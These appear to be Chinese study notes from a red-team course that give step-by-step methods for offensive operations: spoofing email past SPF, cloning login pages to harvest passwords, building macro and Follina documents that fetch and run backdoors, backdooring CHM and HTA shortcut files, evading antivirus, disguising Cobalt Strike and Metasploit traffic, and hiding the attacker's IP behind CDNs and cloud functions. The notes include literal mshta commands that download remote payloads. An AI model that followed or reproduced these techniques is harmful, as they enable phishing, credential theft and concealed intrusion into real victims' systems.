## APT

# 钓鱼

取得受害者信任邮件：发信人地址，邮件内容（话术），兴趣话题  

钓鱼就是用----制作网页或者直接就是一个文件。

 --- 发件人的邮箱地址伪造  spf---发件人策略框架电子邮件认证机制 ---作用是防止伪造邮件地址

 判断SPF   临时邮箱---是用来防溯源（网上找一个就行）  无spf验证和有spf验证

<img width="420" alt="image" src="https://github.com/user-attachments/assets/462bb27d-51a8-407d-b297-69edd48abb54" />


<img width="420" alt="image" src="https://github.com/user-attachments/assets/10778fe1-1fe0-419d-800b-761439921790" />


无spf验证就直接伪造，有spf就转发或者模糊。

这种就是  ~all ，也就是说 ip除了这个范围都能发，基本就是没验证：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/8e01c831-1a79-468f-90ce-0763445a22d1" />


<img width="420" alt="image" src="https://github.com/user-attachments/assets/76ad7b78-1a05-4b7d-9534-a83421e2dd40" />

  kali自带工具： swaks   可以伪造邮箱给临时邮箱发送邮件。没有spf验证就直接伪造：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/d096edb5-982b-4571-988f-80baa79f54bc" />


38min  大厂一般都有spf验证，方法一般是转发或修改后缀等方法，修改后缀 ：字体上的相似：1--l   0----o---O   域名上的：aliyun--aliyum    41min                          记得先将自己的spf验证打开

这里就是spf验证没有通过，所以没有发给qq.com,他会验证你的发件人和发件的服务地址是否相同（admin.qq.com）,这里明显不一致，所以失败：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/69ea6e2e-6050-4bf2-991d-f0854a266113" />

可以用混淆：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/d62c10aa-3e53-4ae6-a44c-a92517f8f730" />


 转发：  在线邮件系统，作为中转服务器https://www.sendcloud.net/。发给网易，但是进入垃圾箱了，-----重新找个号 1h05min 继续演示。**API_USER**       Aasddssd@sad

<img width="420" alt="image" src="https://github.com/user-attachments/assets/015539fb-0659-4562-999e-45cf6355fe02" />

xd视频案例
<img width="420" alt="image" src="https://github.com/user-attachments/assets/d360fd63-eae0-4eaf-8a47-69dae127b5bb" />


### gophish

  本地工具gophish.exe ，邮件转发、运行后重新更改密码：admin/admin!@#45         打开进行配置：qmgxqmobmfobbhfg 这就是邮箱的使用权，使用口令：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/ae3b22f3-35e2-4acb-bfef-9459a108010a" />


制作钓鱼页面：
![image](https://github.com/user-attachments/assets/000ff431-5cc5-4b46-a009-edb838db3945)





这里导入还要注意格式，有的可能会乱码，

![image](https://github.com/user-attachments/assets/e4e3bde8-fb4c-4929-8407-16700a4b4ddd)



还可以伪造链接：
<img width="420" alt="image" src="https://github.com/user-attachments/assets/80a06209-b804-4900-9efc-3d4e05316c7b" />


这里都需要配置：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/516d9594-1a25-499a-a338-571f17d030bc" />

![image](https://github.com/user-attachments/assets/660f4f3b-1eee-4e79-b17f-30800bb340a8)


然后收到钓鱼的，点击链接会跳转到自己写的网址，但是这里发件人为自己：

![image](https://github.com/user-attachments/assets/1604ea8e-54f4-4b3c-bff1-b8c0e58c7aa9)


 伪造来件人

![image](https://github.com/user-attachments/assets/a00167f4-7f33-4893-a8ca-ad245d926ff9)




最后是成功的，就是会有一个代发的提醒

# SPF

上面就是会有一个代发的提醒，下面这就看怎么绕过

注册一个域名

 gophish

<img width="420" alt="image" src="https://github.com/user-attachments/assets/fa46a1f0-f735-4147-8b92-55ecd6ce47f1" />


39min  演示一遍搭建过程

需要申请一个域名，用来演示，这里就不演示了。懒的配环境，这网址就是你自己的服务器，邮件地址就是自己申请的域名，网址建议在香港，域名就搞便宜的。实战肯定是根据目标机来创建域名。

![image](https://github.com/user-attachments/assets/6521846e-6c0a-41a5-8d05-d7fb6b4adbe1)


然后这里就可以让代发人换成我们创建的域名，配合gohish工具，进行钓鱼：

主要就是在这里换别的都不用太变动，换成test会显示带转发为test

<img width="420" alt="image" src="https://github.com/user-attachments/assets/87df4003-2b96-4563-a7c5-d713aab1a0bf" />


这里就更容易上钩，如果在将域名换个像的，更好：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/15e5bbfd-b9ac-4182-812b-5686032c1454" />


# 网页钓鱼



就是上面钓鱼中的链接点开到自己的网页，网页可以是植入木马或程序，搭建的网页冒充真实站点，通过诱使及引导让受害者下载后门文件或登录自身用户凭据，从而获取目标相关资产信息或权限。

需要处理的是：网页的内容，域名。

#### 工具

  用kali工具setoolkit来制造一个网页、还是有点缺陷的，对大型网站复原的不太好。3站点克隆

<img width="380" alt="image" src="https://github.com/user-attachments/assets/ce32757c-adc8-41b1-9abc-7d06ffe3a08f" />


复制成功，有点小瑕疵，毕竟是个大厂的站（只是学习一下）：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/10188ada-179f-4207-b18c-a6df16e7c0f2" />


这里还能捕获到登录的账号密码，密码是jd自己的加密：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/c0343f56-45d2-43ef-8bf3-925b3e080ab1" />



登录几个方法：账户密码、扫码、手机短信验证。

 武大的，可以接收到输入的信息，        ----- 21 min 

制作网页大多数是获取用户登录密码，但是大多密码都是加密的，所以这里就需要解密，JS逆向    这种网站就可以抓到（小网站）：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/543cc3ce-289d-45d0-8107-436fad23f634" />


这里动态码抓到了，明文：

![image](https://github.com/user-attachments/assets/5d994971-385a-44ff-aa48-07df4ec10eab)


这种二维码就抓不到：
![image](https://github.com/user-attachments/assets/cea38e1d-5b54-4cfe-ba8b-3c9e0c4d7753)


##### 2

  国产的，gobin，     构造页面用gobin.yaml，构造攻击用demo.yaml。抓取账号信息在access.log中

工具的优点就是方便，但是缺点很明显：是借助的原本网页的流量，来伪造的，所以这里加密方式也是别人的，需要自己解密。类似于端口映射。
<img width="420" alt="image" src="https://github.com/user-attachments/assets/5d061916-720b-4f9f-b913-02b57a856e72" />


<img width="420" alt="image" src="https://github.com/user-attachments/assets/c4c354a3-d42f-4433-b47c-1f33e081945a" />




<img width="420" alt="image" src="https://github.com/user-attachments/assets/43353c4a-f101-47fb-b4be-92a4b836f811" />




![image](https://github.com/user-attachments/assets/77e6a46a-fded-41af-8c39-386b94b54e9a)


抓取：这里密码还是密文

<img width="420" alt="image" src="https://github.com/user-attachments/assets/4ca5fb94-f0dd-4c88-bca1-e9f9606971e7" />


#### 手工
自己手工的优点：就是解决加密的逻辑的地方，这里是将要制作的网页先另存为，然后找加解密的地方。

这里以jd的登录页面为例子：

![image](https://github.com/user-attachments/assets/b19cccec-c553-4caa-ad9d-565f3e9076fa)


在找到登录框按钮的位置：

![image](https://github.com/user-attachments/assets/1c74dfd4-42f9-4e01-b203-e4b4319527b9)


定位完成后：

  开始手工制作钓鱼页面。

更改3段地方，最后让把登录的账户密码给我们写的post.php脚本中：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/5fe8c91b-a3b6-44cf-a88c-6043eba56d9b" />



<img width="420" alt="image" src="https://github.com/user-attachments/assets/d5d390ff-5b09-4585-8e75-84711bc7c20f" />


post.php：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/312d6e31-53c7-4a65-89aa-d371fa8191a9" />


<img width="420" alt="image" src="https://github.com/user-attachments/assets/24797d1d-5aae-41f0-a1d0-0bc4b31a8464" />


![image](https://github.com/user-attachments/assets/ea8fb2af-2bfa-458d-b0dc-0ef3cc259535)

如果登录为扫二维码登录。思路：（异步调用）将自己本地的二维码放到钓鱼网页上，然后让目标扫，在自己本地进行登录。一般来说扫的二维码都是http:\\weixin..........的网页，这里就找到替换成自己的。

思路：就是将钓鱼页面的网站二维码换成自己这边在线的二维码，让鱼儿扫钓鱼页面的，然后自己这边就成功登录鱼儿的账号。

![image](https://github.com/user-attachments/assets/d01a87ae-990f-4374-a588-60306fabe781)


二维码没有搞出来，下节课继续。思路比较重要。

#宏  

#### office利用



本机office有点问题，完了还没有虚拟机，搞不了。wps上线不了
<img width="420" alt="image" src="https://github.com/user-attachments/assets/ff816c70-3b1c-4e1c-b89c-c9cae084d480" />


 cs生成宏 

<img width="420" alt="image" src="https://github.com/user-attachments/assets/671ab0f8-f318-4457-9ca6-d317e9aa68b7" />


10min 宏上线

<img width="420" alt="image" src="https://github.com/user-attachments/assets/3da16753-2ee9-438d-9f24-ba67ad0068b0" />


选择否，选择这里两种格式的文档后缀便可以用宏上线，docx新版的格式是上线不了宏的，而且这两种docm和doc打开后是需要点击启动宏才能完成上线，所以用office钓鱼时就让对方、诱导他启用宏，比如说什么，启动后才能打开啥的、或者启用宏后才能编辑啥的：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/7cd42edf-a649-41da-b655-7a1922b760c0" />


##### docm：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/f3b35f72-cf26-4f6f-9ec9-3267ba3e9a3f" />


这里需要点击启用宏，所以新版office比较难上线：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/8ce92c43-3f68-42d2-bcb0-0269c9d3bb5b" />



##### doc:
<img width="420" alt="image" src="https://github.com/user-attachments/assets/a2a2424a-14cc-4226-b04a-58aec555f98c" />


18min   早期的word版本是可以上线的，现在是需要启动功能后才能上线 .    c2默认生成的宏代码也需要做免杀，	   模版-启动模版宏 ： dotx-dot dotm  	 potx-pot potm 		xlst-xlt xltm  需要改文件格式，保存宏文件需要用到以前的格式来保存

 将新版换成老版本docx-doc&docm	xlsx-xls&xlsm	pptx-ppt&pptm

#### excel利用：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/4458580a-a686-4edc-98ff-3e1db6021c65" />


诱导目标上钩：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/cfb243d6-373f-4d2a-b20e-256341a37faf" />


pptx-ppt&pptm的这两种ppt&pptm也就不说了。

另一种格式xlsm也可以，就不演示了，过程一样。



#### 模板：

   模板文件。 所以就可以看文档的后缀来知道是否为钓鱼文件，也不一定

<img width="420" alt="image" src="https://github.com/user-attachments/assets/0ed2bebc-b6eb-4ecd-9ff6-cc1e3c300867" />

保存模板：


<img width="420" alt="image" src="https://github.com/user-attachments/assets/3905d372-b70c-4769-8c2b-14b18feccd48" />


这里就可以将模板发过去钓鱼：
<img width="420" alt="image" src="https://github.com/user-attachments/assets/27f7188e-575d-49d0-ad74-b038751ff5ea" />



#### CVE ：

  CVE      影响office不仅和版本有关，也和内部版本有关，就是内核问题。

这里看着是2021专业增强版，但是CVE是对里面的内部版本也有差异，就是也得看内部版本好是否符合：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/ee09554b-9f1a-47fc-8c13-d88af3f5060e" />


执行这个命令后如果有计算器弹出，则存在该漏洞cve-2022

<img width="420" alt="image" src="https://github.com/user-attachments/assets/43807193-7306-4775-a43a-886ceb910ad4" />

  复现   这里是用exp生成一个doc文档，然后上传到目标，打开文档后执行写入的脚本命令，远程下载一个后门，并运行，这里对打开的office版本（内部版本号和自身版本）有要求，也要对文档和远程后门进行免杀处理。

先在此目录下开一个8080端口的web服务，方便让后门远程下载后门（8123.exe后门）
![image](https://github.com/user-attachments/assets/7f26f700-c90e-41ae-afd0-031f7e396f1b)


下来就是用exp的py文件生成一个doc文件，这里的exp原本是用来生成一个nc的doc文档，然后再反弹回来，我们这里是用它生成一个带后门的（远程下载后门）doc文档，所以后面那些什么端口和ip不用管，本来是用于nc反弹的：

先更改远程下载的ip和端口，刚才开的web服务(实战肯定就是 外网ip)：

![image](https://github.com/user-attachments/assets/284e368b-dcdc-4c3f-a02a-f0a6d8a04259)


执行命令生成follina.doc文档

![image](https://github.com/user-attachments/assets/5886081d-58fc-405d-a384-1192ecdf2b91)


将生成的文档上传目标，诱导打开（当然后期需要对其进行免杀处理），打开后会将后门下载到指定目录，命名为nc.exe（再py脚本中可以更改）：
<img width="420" alt="image" src="https://github.com/user-attachments/assets/425bd81f-e26c-4930-82c4-5fd8a015eedd" />


然后只需要将生成的文档打开就可以实现上线

 office历史版本。

   CVE2021：

使用msf上线，就是利用msf生成一个带后门dll文件，再用cve的exp脚本绑定dll文件生成一个docx文档，、

在启动msf监听刚才的dll文件，还需要监听文档。将文档上传到目标上执行，上线msf：

<img width="420" alt="image" src="https://github.com/user-attachments/assets/d7540f91-b228-4d0b-97fa-558091551af6" />





1h28min  邮件免杀：内容免杀，一般就是拦截关键字，需要注意敏感字



# RIO：

#### RLO后缀

  可以用RIO技术将文件后缀名更改，既更改了文件后缀，又还能执行文件本来功能。

<img width="420" alt="image" src="https://github.com/user-attachments/assets/2594d86b-1b47-4205-8c54-9c82d2a66c6c" />




#### 电子书

CHM  后缀       利用电子书实现无文件上线。利用的是Web投递在电子书中插入

<img width="420" alt="image" src="https://github.com/user-attachments/assets/61e73745-109d-4fbc-b087-e11386e7b63a" />


编译刚才的html文件为电子书：

![image-20241226214236297](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226214236297.png)

这里是需要对刚才的powershell命令进行免杀处理

运行生成的chm文件后成功上线：

![image-20241226213815024](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226213815024.png)

20min  电子书 是用来解释的，用途类似和readme.md一样，用工具将器反编译出来，在将后门语句插入，在编译出来，然后一打开电子书就执行我们的后门语句。

电子书也比较容易免杀

![image-20241226220516656](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226220516656.png)

用工具反编译：

![image-20241226220651157](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226220651157.png)

可以看出来反编译后的和原来的 chm  框架一样：

![image-20241226221229644](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226221229644.png)

然后将反编译后的index.html修改：

![image-20241226230427249](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226230427249.png)

在将更改后的html文件保存后将整个x64dbg文件进行编译生成CHM：

![image-20241226230933825](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226230933825.png)

运行生成的chm，成功上线：

![image-20241226230917063](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226230917063.png)



电子书大概这是这样，正常反编译后修改，加载自己的后门代码，反返回成chm，执行上线

#### 快捷方式：

31min hta文档   这里注意，做成的快捷方式的图标最好选用电脑自带的（我的电脑图标），假使目标电脑上没有你图标上的软件，那么就会显示异常或者空白，有两处需要做免杀：1、远程调用执行的命令，2、远程下载的后门文件

先生成一个hta文档。文件托管可以用cs作为服务器来实现远程下载，就跟python -http.server 服务开个端口让远程下载一样：

![image-20241226231436584](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226231436584.png)

C:\Windows\System32\mshta.exe http://192.168.139.128:89/download/file.ext   放到快捷里面的目标：



![image-20241226232029809](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226232029809.png)

还有就是要注意：假使目标电脑上没有你图标上的软件，那么就会显示异常或者空白

![image-20241226232332241](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226232332241.png)

#### 自解压文件：

45min 将两个文件放一个exe里，里面有一个为后门，另一个为正常 ，这个免杀就是做那个为后门的exe

## 复现

这里因为没有自解压的工具，在204的火绒机器自带的，





#### 捆绑：

1h01min   将多个软件放到一个， 就是将2个exe融合成一个，而上面的自解压没有改变2个exe，是2个独立的exe。这里捆绑就将2个融为一个exe了，这是两个区别：捆绑是1.exer+2.exe=3.exe   而自解压是1.exer+2.exe =（1.exer+2.exe）

运行后成功上线：

![image-20241226233801398](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226233801398.png)

1h12min  windows自带捆绑器：IExpress 、

![image-20241226234147664](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226234147664.png)

选择要add的文件、需要捆绑的文件：

![image-20241226234250785](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226234250785.png)

![image-20241226234407739](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226234407739.png)

生成的：

![image-20241226234449083](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226234449083.png)

![image-20241226234655154](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241226234655154.png)

# 免杀

#### 1、

5min      捆绑的exe免杀

先将bin文件异或后再生成exe用来调用bin 文件，分离：

![image-20241227135020461](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227135020461.png)

![image-20241227135600527](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227135600527.png)

这里就是分离的思想，只需要将后门exe免杀就行，捆绑后的exe也是免杀的。



#### 2、

9min   自解压免杀

一样，也是将我们的后门exe免杀就行。

#### 3、

16min  快捷方式-------主要：1、拦截执行下载的mshta.exe程序，2、远程下载的hta文件

![image-20241227173500530](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227173500530.png)

25min绕拦截            后面图像有问题，中间翻车制作vba的免杀被剪掉了，vba在这里火绒是既要mshta程序进行处理，又要对vba本身进行混淆加密。

hta文档里的vba文件直接被杀，所以需要做免杀：

![image-20241227192737444](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227192737444.png)

![image-20241227192715013](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227192715013.png)

加密：

![image-20241227194313535](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227194313535.png)

用cmd.exe调用执行copy 将刚才加密后的两个vbs放到web站点上：

![image-20241227194424214](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227194424214.png)

40min  制作powershell的免杀---------这里都是做的快捷方式的hta文件，只是hta有许多格式。powershell、vba     这里是要对powershell.exe进行copy处理，但是不用对powershell执行的命令免杀，这就是内存问题。

![image-20241227201203409](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227201203409.png)

C:\Windows\System32\cmd.exe /c copy C:\Windows\System32\mshta.exe ms.exe & ms.exe http://192.168.139.128:96/download/file.ext     ![image-20241227201240328](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227201240328.png)

现在这方法已经不适用了，用不了了。远程调用时候会被杀。



#### 4、

54min   office 宏免杀。模板免杀，这里找到模板的地址，发现创建一个模板文档时会调用一个路径，这路径就是模板的地址，那么就可以更改他调用的模板路径为我们宏的远程地址，进而加载上线。但是这里只能过表面，运行加载远程宏时会被发现

生成一个宏模板文件 11.docx，宏为空的，将宏模板后缀改为zip，打开后后有setting 文件

![image-20241227202240358](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227202240358.png)

打开setting 文件：

![image-20241227202622703](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227202622703.png)

这里就是将这个地址改为我们的远程地址：qdaaa.dotm 里面加宏代码后门，保存为dotm的宏模板文件,放到我们的cs远程地址上。然后重新打开刚才的setting 文件，替换为我们的远程地址，  在重新打开  11.docx 就可以执行宏代码上线。

![image-20241227203110109](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227203110109.png)

这里的宏代码需要经过加密，也可以用刚才的vbs加密器进行加密。

![image-20241227203035552](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227203035552.png)



# 近源

不用复现，需要无线网卡设备。

#### wifi 钓鱼：

要用到商业产品。WIFI-Pumpkin3

14min    要打开kali的VM的插网卡的设置，并且能上网  lsusb ，获取usb设备的网卡，插上后kali的ip里就有wlan0

![image-20241227225603942](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227225603942.png)

打开WIFI-Pumpkin3工具，配置好，

![image-20241227225724785](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227225724785.png)

![image-20241227230008144](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227230008144.png)

然后start后就能在自己这的wifi列表发现刚才设置的xiaodisec网络，这里xiaodiisec没有设置密码：

![image-20241227230108616](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227230108616.png)

然后一连接就显示出来鱼儿的信息了：

![image-20241227230248100](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241227230248100.png)



就这个样子，结束。 

# 近源

#### BADUSB

就是插有毒的U盘

3min  需要安装arduinoIDE         插上我们买的U盘，用这个工具arduinoIDE写入我们的后门保存里面，

![image-20241228130335647](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228130335647.png)

然后只需要将U盘插入目标机器上就可以上线。

这不是U盘病毒，这是usb设备病毒，这插上不会显示多一个盘。就跟鼠标的usb一样。

这原理就是模拟键盘按键，用按键来执行我们写的命令执行上线，那么锁屏情况下就不会上线------锁屏敲不了命令。

# 流量隐匿

蓝队的设备会分析到流量特征然后拉黑ip；c2：MSF  CS Sliver Chaos  Viper 等   webshell ：菜刀 蚁剑 哥斯拉  冰鞋

8min  nc  明文传输 容易被发现，所以就需要在我们攻击端生成自己的证书，让通讯流量加密，好比http 和 https 区别。

![image-20241228173939844](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228173939844.png)

打开wireshark进行抓包，获取到的流量追踪流得到刚才执行命令，发现这里都是明文：

![image-20241228174311812](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228174311812.png)

13 min 生成证书工具openssl，流量通讯就会加密，就不会让蓝队容易发现：

![image-20241228175242330](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228175242330.png)

这下流量就经过加密了，没有解密就无法判断执行看什么：

![image-20241228175124249](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228175124249.png)



##### MSF

###### http:

18min  MSf 生成HTTP(reverse_http)后门执行上线，在目标机上捕获流量数据包，走的是http协议：

MSF http  ： 第一次数据包，有post和get    post可能就是上线后我们执行命令产生的数据包。

MSF  http ：第二次数据包（和第一次上线时候的后门是一样的），也是有post和get数据包，两次对比流量数据包

发现两次的  get 数据包都是5行数据，有两个固定的connection 和 cache-control两个头，这是msf的弱特征，正常的网站数据包一般不会固定行数和有两个固定头。

MSF上线火绒机就不演示了，（免杀先不考虑），下面是执行上线命令后在目标机上捕获到的数据包：

![image-20241228180427093](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228180427093.png)

get数据和post数据包：

![image-20241228180712498](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228180712498.png)

第二次上线的数据包，将监听端口换成1234：

![image-20241228181805581](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228181805581.png)

不难看出 Get包是Connection: Keep-Alive        Cache-Control：no-cache这两个头不变

###### https

30min  MSF HTTPS(reverse_https)，继续执行上线，在捕获流量数据包，这里走的就是tls协议：

 数据包中会有https证书的信息,这里证书会变（每次监听都会变），没有特征。

![image-20241228184536323](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228184536323.png)

这里访问msf的后门地址，查看证书和流量包中的证书一样（当然每次不同后门，证书也是不同，随机变化的）。所以没有特征。工具中自带的随机方式更改证书：

![image-20241228200218482](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228200218482.png)

38min  利用工具生成一个带有baidu的证书，这样就会信任，在用这个证书生成一个后门，捕获到的流量/打开后门的网址的证书就是Baidu的证书。也不是说信任，就是可以迷惑蓝队在分析流量包，他如果不懂看见baidu的证书可能就放过这个流量包了：

生成证书，在生成一个带证书的后门：

![image-20241228203552747](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228203552747.png)

监听：

![image-20241228203631973](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228203631973.png)

最后的证书就是www.baidu.com

##### CS：

###### http：

51min    cs强特征：get请求为5行数据，post 请求为submit.php?id=数字    post 的UA头，get路径特征：checksum8算法，get /....     算法解密字符为93-----上线的目标机为64位           92 ------ 32位       免杀前面讲过

用cs的http后门上线，捕捉到的流量，几个特征还是比较明显的  GET还是5行， 完了post有submit.php  还有UA也像，当然get后面那个 /Yi7d 是根据checksum算法生成的：

![image-20241228204618439](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228204618439.png)



改特征的思路：1、二开魔改  2、引用profiles文件，更改请求规则实现更改特征

1h10min  用profiles文件，

![image-20241228205942072](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228205942072.png)

生成新后门后抓取流量，弱特征，checksum8算法更不一样：

![image-20241228210331626](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228210331626.png)

1h20min   改profiles文件，profiles也会改心跳包的延迟时间，改速率。

发现是在这里定的get post方法： 

![image-20241228212346301](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228212346301.png)

更改特征包：

![image-20241228212558515](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228212558515.png)

重新启动cs，产生后门上线，抓取流量包：

![image-20241228213031039](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228213031039.png)

###### https:

tls协议

1h27min 只能通过魔改。

创建https的监听器，在生成后门：

![image-20241228213549633](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228213549633.png)

弱特征，也会有hello：

![image-20241228213931720](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228213931720.png)

主要特征：JA3/JA3S算法。弱特征：client /server   Hello两个特征，cs第一次通讯会产生的。

1h32min  强特征：ja3box工具、解数据包的信息。将数据包导出来用工具解密，（也支持监听网卡的流量）然后对比解密出来的md5值和cs的ja3的特征md5值进行比对。  就是比对TLS协议包（https），https主要就是这个ja3/ja3s特征。

那么下来想改动这个ja3特征，就只能通过魔改源码进行更改ja3特征。

![image-20241228214452853](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228214452853.png)

下来就是将刚才cs抓到的流量包保存到ja3box.py目录下：

![image-20241228214607945](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228214607945.png)

将刚才保存的流量https.pcapng解开，对比后和cs特征值一样，那就可以判断为cs，这是https的强特征：

![image-20241228215427539](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228215427539.png)

![image-20241228215321594](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228215321594.png)

那么怎么改这种强特征呢，就只能在源码中改。可以在公众号或者在一些星球中看怎么魔改，xd这里没有演示，我猜他也不会。。。（xd说他后面蓝队讲，我猜是缓兵之计。。。）

###### else:

1h41min  更cs默认端口，改启动文件，teamserver就行。还有更改证书指纹，自己重新添加一个证书，然后更改cs启动调用的证书文件位自己更改后的。----这两个特征是基础特征，就是第一个需要改的。

cs默认端口一般为50000/50050，这里也需要改：

![image-20241228220541809](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228220541809.png)

还需要改证书，上面可以看见，启动时候会加载cs的.store证书，查看cs证书：

![image-20241228220907089](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228220907089.png)

所以这样改就行，画红线的都是可以自己操作，改成自己想的：

![image-20241228221150557](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241228221150557.png)

# 防溯源

5min   进程监听工具：

![image-20241229152355206](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229152355206.png)

 这里就是攻击者的ip，所以需要进行处理保护ip。

#### cdn：

11 min 云函数，cdn加速       找CDN有时候也可以用国外服务器请求目标地址来获取真实ip，因为他的cdn加速可能范围可能不是全球范围。

![image-20241229130638655](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229130638655.png)

超级Ping ,各地ping      是用来加速的域名访问的，加网速，我们可以用来隐藏ip地址。

20min  配置cdn。 注意，cdn我用的是50g/1年的试用

###### 卡这儿了：

![image-20241229172052132](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229172052132.png)



30min 还可以配置ip上线。

就是让你监听到的ip是cdn的ip，不是真实攻击机的ip，防止溯源。











#### 云函数

39min  云函数上线c2

云函数就是给你一个运行代码的接口。也是充当一个中转器，溯源时也只能找到中转地方。而且这里的域名是百度旗下的，不像cdn是自己申请的，域名不一定是白名单域名。所以这里更能过edr

目前腾讯云上线c2已经不行了，腾讯云的api网关触发器不支持了，产品下线了。所以这里更换为百度云。

![image-20241229214514682](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229214514682.png)

45min  配置云函数（百度云），这里上线注意防火墙

![image-20241229214821128](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229214821128.png)

用百度云

54min   科莱         白名单baidu云，蓝队用科莱查看后门的证书，域名解析是白名单，就不容易被发现：

![image-20241229214315206](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229214315206.png)

这里后门也不是攻击机的ip地址：

![image-20241229214942680](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229214942680.png)



#### 数据中转

1h02min    就是在本地144（ip）先生成85.65ip监听器的后门，然后让 85.65在作为中转 转发流量到我们本地144，所以后门最后就在本地上线，而且溯源找的是85.65          85.65服务器上是没有cs的，所以不转发流量的话是上线不了的。

1h08min 在本地进行中转，只需要在cs上开kali的监听器就可以上线。如果kali没有转发流量，那么就上线不了：

![image-20241229174049846](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229174049846.png)



#### 反向代理

1h15min 原理也是中转的，代理么，代理流量（socks），区别就是可视化。当目标排查到ip时会打开你的ip地址端口，这里打开是apache搭建的，为web网页，而上面的中转技术，打开就什么都没有。就是可视化差异。

![image-20241229175342695](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241229175342695.png)

假如在kali2上搭建web，他有apache服务，那么打开就可以发现是个apache服务。



# 代理池

蓝队就比较注重ip溯源，经常封ip，拉黑。那么我们红队被拉黑或者快被拉黑时怎么处理：

